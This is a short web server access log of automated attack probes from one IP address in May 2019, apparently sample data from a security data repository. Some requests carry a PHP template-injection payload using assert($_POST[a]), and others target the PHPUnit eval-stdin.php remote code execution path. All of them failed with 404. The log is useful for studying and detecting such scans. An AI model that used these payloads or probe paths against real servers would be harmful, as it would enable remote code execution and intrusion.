103.123.161.21 - - [14/May/2019:05:42:31 -0700] "POST /index.php?m=vod-search&wd=%7Bif-A:assert($_POST%5Ba%5D)%7D%7Bendif-A%7D HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:31 -0700] "POST /index.php?m=vod-search&wd=%7Bif-A:assert($_POST%5Ba%5D)%7D%7Bendif-A%7D HTTP/1.1" 404 294 "http://www.secrepo.com/index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:32 -0700] "POST /search.php HTTP/1.1" 404 294 "http://www.secrepo.com/search.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:32 -0700] "POST /search.php HTTP/1.1" 404 294 "http://www.secrepo.com/search.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:33 -0700] "POST /search.php HTTP/1.1" 404 294 "http://www.secrepo.com/search.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:33 -0700] "POST /search.php HTTP/1.1" 404 294 "http://www.secrepo.com/search.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:34 -0700] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 294 "http://www.secrepo.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:34 -0700] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 294 "http://www.secrepo.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:35 -0700] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 294 "http://www.secrepo.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
103.123.161.21 - - [14/May/2019:05:42:35 -0700] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 294 "http://www.secrepo.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
